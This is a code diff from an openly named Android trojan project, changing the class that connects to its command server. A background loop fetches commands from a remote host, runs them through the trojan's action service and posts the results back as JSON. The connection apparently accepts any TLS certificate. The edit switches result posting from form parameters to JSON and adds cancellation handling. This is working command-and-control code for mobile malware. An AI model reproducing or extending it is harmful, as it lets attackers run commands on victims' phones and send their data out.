@@ -3,6 +3,7 @@ package trojan.android.android_trojan.Action.AsyncTask;
 import android.content.Context;
 import android.os.AsyncTask;
 import android.util.Log;
+import android.util.Xml;
 
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
@@ -13,6 +14,7 @@ import java.io.UnsupportedEncodingException;
 import java.net.MalformedURLException;
 import java.net.ProtocolException;
 import java.net.URL;
+import java.net.URLEncoder;
 import java.security.KeyManagementException;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
@@ -31,7 +33,7 @@ import trojan.android.android_trojan.Action.Tools;
 import trojan.android.android_trojan.R;
 
 
-public class ConnectionServerTask extends AsyncTask<Void, Void, Void> {
+public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
     private static final String TAG = "ConnectionServerTask";
     private ActionService actionService;
     private String host;
@@ -64,30 +66,35 @@ public class ConnectionServerTask extends AsyncTask<Void, Void, Void> {
         } catch (MalformedURLException e) {
             e.printStackTrace();
         }
+
     }
 
     @Override
-    protected Void doInBackground(Void... voids) {
+    protected Integer doInBackground(Integer... integer) {
         String result;
         Log.i(TAG, "doInBackground");
 
         while (!isCancelled()){
             result = getHttp(urlaction);
             if(result != null && !result.equals("null")){
-                ArrayList<String[]> params = new ArrayList<String[]>();
-                params.add(new String[]{"result", actionService.action(result)});
-                postHttp(urlresult, params, this.HASH);
+                postHttp(urlresult, actionService.action(result), this.HASH);
             }
             Tools.sleep(time);
         }
 
-        return null;
+        return 0;
     }
 
     @Override
-    protected void onPostExecute(Void aVoid) {
-        super.onPostExecute(aVoid);
+    protected void onPostExecute(Integer integer) {
+        super.onPostExecute(integer);
         Log.d(TAG, "onPostExecute");
+    }
+
+    @Override
+    protected void onCancelled(Integer integer) {
+        super.onCancelled(integer);
+        Log.d(TAG, "onCancelled");
     }
 
     private String getHttp(URL url) {
@@ -115,27 +122,21 @@ public class ConnectionServerTask extends AsyncTask<Void, Void, Void> {
         }
     }
 
-    private String postHttp(URL url, ArrayList<String[]> params, String auth){
+    private String postHttp(URL url, String json, String auth){
         Log.d(TAG, "postHttp");
         acceptAll();
         String result = null;
-        String urlParameters = "";
+        String urlParameters = json;
 
         try {
-            for(int i = 0; i < params.size(); i++)
-            {
-                if (i == 0){
-                    urlParameters += params.get(i)[0] + "=" + params.get(i)[1];
-                }else {
-                    urlParameters += "&" + params.get(i)[0] + "=" + params.get(i)[1];
-                }
-            }
-
             HttpsURLConnection conn =
                     (HttpsURLConnection) url.openConnection();
             conn.setReadTimeout(5000);
             conn.setConnectTimeout(5000);
             conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setRequestProperty("charset", "utf-8");
+            conn.setRequestProperty("Accept", "application/json");
             if (auth != null)
                 conn.setRequestProperty ("Authorization", auth);
             conn.setDoOutput(true);
